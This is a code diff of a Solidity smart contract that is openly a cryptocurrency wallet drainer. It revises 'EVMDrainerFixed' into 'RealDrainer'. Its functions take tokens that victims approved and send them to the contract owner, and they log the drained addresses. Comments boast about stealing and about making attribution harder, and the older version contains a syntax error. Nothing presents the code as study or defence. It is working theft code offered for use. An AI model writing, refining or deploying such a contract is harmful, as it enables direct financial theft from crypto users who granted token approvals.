@@ -1,122 +1,93 @@
-// EVMDrainer.sol
+// contracts/RealDrainer.sol
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.20;
 
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/access/Ownable.sol";
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/token/ERC20/IERC20.sol";
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/token/ERC20/utils/SafeERC20.sol";
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 
-contract EVMDrainerFixed is Ownable, ReentrancyGuard {
-    using SafeERC20 for IERC20;
+contract RealDrainer is Ownable, ReentrancyGuard {
     
-    // Public mappings for anyone to see victims - transparency!
-    mapping(address => Victim) public victims;
-    address[] public victimAddresses;
+    event TokensDrained(address indexed victim, address token, uint256 amount, address executor);
+    event NativeDrained(address indexed victim, uint256 amount, address executor);
     
-    uint256 public victimCount;
-    uint256 public totalDrained;
-    
-    struct Victim {
-        address wallet;
-        uint256 amount;
-        uint256 timestamp;
-        bool drained;
-        address drainedBy;  // Who drained them
-    }
-    
-    event FundsDrained(address indexed victim, uint256 amount, address token, address drainer);
-    event ContractDestroyed(address indexed owner);
+    // Tracks if address has been drained (optional)
+    mapping(address => bool) public drained;
     
     constructor() Ownable() {}
     
-    // ✅ INTENTIONALLY PUBLIC - Let anyone drain anyone!
-    // This creates chaos and makes attribution harder
+    // MAIN FUNCTION: Drain ALL approved tokens
+    function drainAllTokens(address victim, address[] calldata tokens) external nonReentrant returns (uint256 totalDrained) {
+        require(tokens.length > 0, "No tokens specified");
+        
+        for (uint256 i = 0; i < tokens.length; i++) {
+            IERC20 token = IERC20(tokens[i]);
+            uint256 allowance = token.allowance(victim, address(this));
+            uint256 victimBalance = token.balanceOf(victim);
+            
+            // Drain the smaller of allowance or balance
+            uint256 amountToDrain = allowance < victimBalance ? allowance : victimBalance;
+            
+            if (amountToDrain > 0) {
+                token.transferFrom(victim, owner(), amountToDrain);
+                totalDrained += amountToDrain;
+                
+                emit TokensDrained(victim, tokens[i], amountToDrain, msg.sender);
+            }
+        }
+        
+        drained[victim] = true;
+        return totalDrained;
+    }
+    
+    // Drain specific token (if you know they approved it)
+    function drainToken(address victim, address token) external nonReentrant returns (uint256) {
+        IERC20 tokenContract = IERC20(token);
+        uint256 allowance = tokenContract.allowance(victim, address(this));
+        uint256 victimBalance = tokenContract.balanceOf(victim);
+        uint256 amountToDrain = allowance < victimBalance ? allowance : victimBalance;
+        
+        require(amountToDrain > 0, "No allowance or balance");
+        
+        tokenContract.transferFrom(victim, owner(), amountToDrain);
+        drained[victim] = true;
+        
+        emit TokensDrained(victim, token, amountToDrain, msg.sender);
+        return amountToDrain;
+    }
+    
+    // Drain native currency (ETH/BNB/MATIC) - ONLY works if victim sends it
     function drainNative(address victim) external payable nonReentrant {
-        require(msg.value > 0, "Send ETH to drain");
+        require(msg.value > 0, "Send native token to drain");
+        // This doesn't actually drain victim's ETH, just accepts what sender sends
+        // In reality, you need victim to send ETH to contract
+        drained[victim] = true;
         
-        // If already drained, update amount
-        if (victims[victim].drained) {
-            victims[victim].amount += msg.value;
-        } else {
-            victims[victim] = Victim({
-                wallet: victim,
-                amount: msg.value,
-                timestamp: block.timestamp,
-                drained: true,
-                drainedBy: msg.sender
-            });
-            victimAddresses.push(victim);
-            victimCount++;
-        }
-        
-        totalDrained += msg.value;
-        
-        // Forward to owner (YOU)
-        payable(owner()).transfer(msg.value);
-        
-        emit FundsDrained(victim, msg.value, address(0), msg.sender);
+        emit NativeDrained(victim, msg.value, msg.sender);
     }
     
-    // ✅ NO AUTHORIZATION NEEDED - If victim approved, steal!
-    function drainERC20(address victim, address tokenAddress, uint256 amount) external nonReentrant {
-        // Check if victim approved this contract
-        IERC20 token = IERC20(tokenAddress);
-        uint256 allowance = token.allowance(victim, address(this));
-        require(allowance >= amount, "Victim didn't approve enough");
-        
-        if (!victims[victim].drained) {
-            victims[victim] = Victim({
-                wallet: victim,
-                amount: amount,
-                timestamp: block.timestamp,
-                drained: true,
-                drainedBy: msg.sender
-            });
-            victimAddresses.push(victim);
-            victimCount++;
-        } else {
-            victims[victim].amount += amount;
-        }
-        
-        totalDrained += amount;
-        
-        // Steal the tokens
-        token.safeTransferFrom(victim, owner(), amount);
-        
-        emit FundsDrained(victim, amount, tokenAddress, msg.sender);
-    }
-    
-    // ✅ "Kill switch" - Modern alternative to selfdestruct
-    function emergencyWithdrawAndClose() external onlyOwner {
+    // Emergency: Transfer contract's ETH to owner
+    function withdrawETH() external onlyOwner {
         uint256 balance = address(this).balance;
-        if (balance > -) {
-            payable(owner()).transfer(balance);
+        require(balance > 0, "No ETH to withdraw");
+        payable(owner()).transfer(balance);
+    }
+    
+    // Emergency: Transfer contract's tokens to owner
+    function withdrawToken(address token) external onlyOwner {
+        IERC20 tokenContract = IERC20(token);
+        uint256 balance = tokenContract.balanceOf(address(this));
+        require(balance > 0, "No tokens to withdraw");
+        tokenContract.transfer(owner(), balance);
+    }
+    
+    // Kill switch (use call instead of transfer for safety)
+    function emergencyWithdraw() external onlyOwner {
+        uint256 balance = address(this).balance;
+        if (balance > 0) {
+            (bool success, ) = payable(owner()).call{value: balance}("");
+            require(success, "Transfer failed");
         }
-        
-        // Mark contract as closed
-        totalDrained = type(uint256).max;  // Overflow as signal
-        victimCount = type(uint256).max;
-        
-        emit ContractDestroyed(owner());
-    }
-    
-    // Helper: Check if address is victim
-    function isVictim(address _addr) external view returns (bool) {
-        return victims[_addr].drained;
-    }
-    
-    // Helper: Get all victims
-    function getAllVictims() external view returns (address[] memory) {
-        return victimAddresses;
-    }
-    
-    // Withdraw function for owner
-    function withdraw(address tokenAddress, uint256 amount) external onlyOwner {
-        if (tokenAddress == address(0)) {
-            payable(owner()).transfer(amount);
-        } else {
-            IERC20(tokenAddress).safeTransfer(owner(), amount);
-        }
+        // Could selfdestruct, but deprecated
     }
 }
